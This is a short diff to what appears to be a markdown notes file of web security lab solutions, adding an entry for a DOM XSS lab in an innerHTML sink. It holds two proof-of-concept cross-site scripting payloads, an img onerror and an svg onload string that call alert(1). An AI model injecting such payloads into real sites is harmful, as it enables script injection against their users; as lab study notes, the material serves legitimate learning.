@@ -26,3 +26,6 @@ use ```storeId="></select><img src=1 onerror=alert(1)>```.
 
 <img width="500" src="https://user-images.githubusercontent.com/68285613/146986519-5c632667-cc06-49fb-90ac-ee63a4db6596.png">
 
+### DOM XSS in innerHTML sink using source location.search
+```</div><svg onload=alert(1)>``` in search box.
+
